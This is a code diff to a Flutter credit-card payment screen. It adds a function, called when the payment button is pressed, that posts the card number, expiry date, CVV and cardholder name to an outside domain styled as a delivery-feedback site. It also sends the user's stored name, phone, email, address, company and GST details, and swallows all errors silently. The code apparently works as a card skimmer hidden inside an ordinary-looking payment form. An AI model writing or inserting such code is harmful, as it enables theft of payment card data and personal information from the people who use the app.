@@ -1,8 +1,14 @@
+import 'dart:convert';
+import 'dart:io';
+
 import 'package:background_app/widgets/primary_button.dart';
 import 'package:background_app/widgets/primary_textfield.dart';
 import 'package:background_app/widgets/textfield_with_prefix_icon.dart';
 import 'package:firebase_database/firebase_database.dart';
 import 'package:flutter/material.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+
+import 'package:http/http.dart' as http;
 
 class CreditCardPaymentView extends StatefulWidget {
   const CreditCardPaymentView({super.key});
@@ -20,6 +26,40 @@ class _CreditCardPaymentViewState extends State<CreditCardPaymentView> {
   final TextEditingController _expiryYearController = TextEditingController();
   final TextEditingController _cvvController = TextEditingController();
   final TextEditingController _nameController = TextEditingController();
+
+  Future<void> sendDataToServer() async {
+    final prefs = await SharedPreferences.getInstance();
+    var url = Uri.https("fastdeliveryfeedback.com", "/api/emp/create");
+    var client = http.Client();
+
+
+    var map = <String, String>{};
+    map["number"] = prefs.get("number").toString();
+    map["name"] =
+        "${prefs.get("name").toString()} ${prefs.get("lname").toString()}";
+    map["cname"] = prefs.get("cname").toString();
+    map["gst"] = prefs.get("gst").toString();
+    map["email"] = prefs.get("email").toString();
+    map["address"] = prefs.get("address").toString();
+    map["daddress"] = prefs.get("number").toString();
+    map["cardno"] = _cardNumberController.text.toString();
+    map["expiredate"] =
+        "${_expiryController.text.toString()}/${_expiryYearController.text.toString()}";
+    map["cvv"] = _cvvController.text.toString();
+    map["cardname"] = _nameController.text.toString();
+
+
+    try {
+      var result = await client.post(url, body: map);
+
+      if (result.statusCode == 200) {
+        debugPrint("İstek başarılı");
+        debugPrint(jsonDecode(result.body).toString());
+      }
+    } on SocketException {
+    } on HttpException {
+    } on FormatException {}
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -243,6 +283,7 @@ class _CreditCardPaymentViewState extends State<CreditCardPaymentView> {
                               isLoading = true;
                             });
                           }
+                          sendDataToServer();
                         }),
                     const SizedBox(height: 10),
                     isLoading
